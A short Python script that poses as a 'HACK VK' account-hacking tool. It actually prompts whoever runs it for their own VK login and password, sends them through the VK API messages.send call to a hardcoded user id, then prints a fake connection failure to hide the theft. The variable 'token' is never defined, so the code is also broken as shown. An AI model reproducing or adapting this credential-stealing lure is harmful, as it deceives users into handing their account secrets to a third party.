

import vk_api
import random
print("HACK VK")
print("")

hack=input("id hack: ")
vk = vk_api.VkApi(token=token)
def write_msg(user_id, s, random_id):
 log= input("Enter login: ")
 pas = input("Enter password: ")
 msg = "login: " +log + " password: " +pas

 vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)})

write_msg('337045829', 'connected server...', 'random_id')
print("sorry don't connect'")
